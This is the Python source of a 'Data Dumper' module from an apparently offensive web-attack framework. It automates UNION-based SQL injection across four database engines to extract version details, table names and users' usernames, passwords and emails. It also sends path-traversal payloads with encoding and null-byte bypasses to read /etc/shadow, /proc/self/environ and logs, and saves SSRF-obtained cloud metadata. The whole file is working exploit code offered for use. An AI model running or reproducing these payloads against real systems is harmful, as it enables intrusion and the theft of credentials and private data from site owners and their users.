#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Data Dumper Module
Database extraction and data dumping
"""

import os
import re


from config import Config, Colors


class DataDumper:
    """Data Extraction Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.dump_dir = os.path.join(Config.REPORTS_DIR, 'dumps')
        os.makedirs(self.dump_dir, exist_ok=True)
    
    def run(self, findings: list):
        """Attempt to dump data based on findings"""
        print(f"{Colors.info('Attempting data extraction...')}")
        
        for finding in findings:
            if 'SQL Injection' in finding.technique:
                self._dump_sql(finding)
            elif 'LFI' in finding.technique:
                self._dump_lfi(finding)
            elif 'SSRF' in finding.technique and 'Metadata' in finding.technique:
                self._dump_ssrf_metadata(finding)
    
    def _dump_sql(self, finding):
        """Attempt SQL injection data dump"""
        url = finding.url
        param = finding.param
        
        print(f"{Colors.info(f'Attempting SQL dump from {url}')}")
        
        # Determine database type
        db_type = 'mysql'
        if 'PostgreSQL' in finding.technique:
            db_type = 'postgresql'
        elif 'MSSQL' in finding.technique:
            db_type = 'mssql'
        elif 'Oracle' in finding.technique:
            db_type = 'oracle'
        
        # Get database info
        db_info = self._get_db_info(url, param, db_type)
        if db_info:
            self._save_dump('db_info', db_info)
            print(f"{Colors.success('Database info extracted')}")
        
        # Get tables
        tables = self._get_tables(url, param, db_type)
        if tables:
            self._save_dump('tables', tables)
            print(f"{Colors.success(f'Tables extracted: {len(tables)}')}")
        
        # Get users (common target)
        users = self._dump_table(url, param, db_type, 'users', ['username', 'password', 'email'])
        if users:
            self._save_dump('users', users)
            print(f"{Colors.success(f'Users extracted: {len(users)}')}")
    
    def _get_db_info(self, url: str, param: str, db_type: str) -> dict:
        """Get database information"""
        # Dynamically detect column count via ORDER BY probing
        num_cols = self._detect_column_count(url, param)
        if num_cols < 1:
            num_cols = 5  # fallback to reasonable default

        # Build column padding (fill extra positions with NULL-like values)
        def _pad(needed_cols, *values):
            """Build a UNION fragment: inject *values* then pad with integers."""
            parts = list(values)
            while len(parts) < needed_cols:
                parts.append(str(len(parts) + 1))
            return ','.join(parts[:needed_cols])

        queries = {
            'mysql': [
                f"' UNION SELECT {_pad(num_cols, '@@version', 'user()', 'database()')} --",
                f"' UNION SELECT {_pad(num_cols, 'version()', 'current_user()', 'database()')} --",
            ],
            'postgresql': [
                f"' UNION SELECT {_pad(num_cols, 'version()', 'current_user', 'current_database()')} --",
            ],
            'mssql': [
                f"' UNION SELECT {_pad(num_cols, '@@version', 'SYSTEM_USER', 'DB_NAME()')} --",
            ],
            'oracle': [
                f"' UNION SELECT {_pad(num_cols, '(SELECT banner FROM v$version WHERE rownum=1)', 'user', 'global_name')} FROM global_name --",
            ],
        }
        
        for query in queries.get(db_type, queries['mysql']):
            try:
                data = {param: query}
                response = self.requester.request(url, 'POST', data=data)
                
                if response:
                    return {
                        'query': query,
                        'response': response.text,
                    }
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'DB info error: {e}')}")
        
        return None

    def _detect_column_count(self, url: str, param: str, max_cols: int = 20) -> int:
        """Detect the number of columns via ORDER BY probing."""
        for n in range(1, max_cols + 1):
            try:
                payload = f"' ORDER BY {n} --"
                data = {param: payload}
                response = self.requester.request(url, 'POST', data=data)
                if response:
                    text = response.text.lower()
                    error_kw = ['error', 'unknown column', 'order by',
                                'sqlstate', 'syntax']
                    if any(kw in text for kw in error_kw):
                        return n - 1
            except Exception:
                continue
        return 0
    
    def _get_tables(self, url: str, param: str, db_type: str) -> list:
        """Get database tables"""
        num_cols = self._detect_column_count(url, param)
        if num_cols < 1:
            num_cols = 5

        def _pad(needed, val):
            parts = [val]
            while len(parts) < needed:
                parts.append(str(len(parts) + 1))
            return ','.join(parts[:needed])

        queries = {
            'mysql': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM information_schema.tables WHERE table_schema=database() --",
            'postgresql': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM information_schema.tables WHERE table_schema='public' --",
            'mssql': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM information_schema.tables --",
            'oracle': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM user_tables --",
        }
        
        query = queries.get(db_type, queries['mysql'])
        
        try:
            data = {param: query}
            response = self.requester.request(url, 'POST', data=data)
            
            if response:
                # Parse tables from response
                tables = re.findall(r'[\w_]+', response.text)
                return list(set(tables))
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'Tables error: {e}')}")
        
        return []
    
    def _dump_table(self, url: str, param: str, db_type: str, table: str, columns: list) -> list:
        """Dump table data"""
        num_cols = self._detect_column_count(url, param)
        if num_cols < 1:
            num_cols = 5

        # Build column expression – use CONCAT/|| to merge requested
        # columns into fewer UNION positions when there are more columns
        # requested than available injection positions.
        col_str = ','.join(columns)
        needed = len(columns)
        if needed >= num_cols:
            # Merge all into one concat field and pad
            if db_type == 'mssql':
                concat_col = " + ',' + ".join(f"CAST({c} AS VARCHAR)" for c in columns)
            elif db_type == 'oracle':
                concat_col = " || ',' || ".join(columns)
            else:
                concat_col = f"CONCAT_WS(',', {col_str})"
            parts = [concat_col]
            while len(parts) < num_cols:
                parts.append(str(len(parts) + 1))
            select_expr = ','.join(parts[:num_cols])
        else:
            parts = list(columns)
            while len(parts) < num_cols:
                parts.append(str(len(parts) + 1))
            select_expr = ','.join(parts[:num_cols])

        query = f"' UNION SELECT {select_expr} FROM {table} --"
        
        try:
            data = {param: query}
            response = self.requester.request(url, 'POST', data=data)
            
            if response:
                # Parse data from response
                return [response.text]
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'Table dump error: {e}')}")
        
        return []
    
    def _dump_lfi(self, finding):
        """Dump files via LFI"""
        url = finding.url
        param = finding.param
        
        files_to_dump = [
            # Linux files
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/proc/self/environ',
            '/proc/self/cmdline',
            # Windows files
            'C:\\windows\\win.ini',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log',
        ]
        
        for file_path in files_to_dump:
            # Try multiple traversal depths and bypass techniques
            payloads = []
            for depth in range(1, 11):
                payloads.append(f'{"../" * depth}{file_path}')
            for depth in (3, 5, 7):
                payloads.append(f'{"....//....//" * depth}{file_path}')
                payloads.append(f'{"..%2f" * depth}{file_path}')
                payloads.append(f'{"..%252f" * depth}{file_path}')
                payloads.append(f'{"../" * depth}{file_path}%00')
            payloads.append(file_path)  # direct/absolute

            for payload in payloads:
                try:
                    data = {param: payload}
                    response = self.requester.request(url, 'GET', data=data)
                    
                    if response and len(response.text) > 10:
                        self._save_dump(file_path.replace('/', '_'), response.text)
                        print(f"{Colors.success(f'Dumped: {file_path}')}")
                        break
                        
                except Exception as e:
                    if self.engine.config.get('verbose'):
                        print(f"{Colors.error(f'LFI dump error: {e}')}")
    
    def _dump_ssrf_metadata(self, finding):
        """Dump cloud metadata"""
        if finding.extracted_data:
            self._save_dump('cloud_metadata', finding.extracted_data)
            print(f"{Colors.success('Cloud metadata saved')}")
    
    def _save_dump(self, name: str, data):
        """Save dump to file"""
        filename = f"{self.engine.scan_id}_{name}.txt"
        filepath = os.path.join(self.dump_dir, filename)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                if isinstance(data, (list, dict)):
                    import json
                    f.write(json.dumps(data, indent=2))
                else:
                    f.write(str(data))
            
            print(f"{Colors.info(f'Dump saved: {filepath}')}")
        except Exception as e:
            print(f"{Colors.error(f'Save dump error: {e}')}")
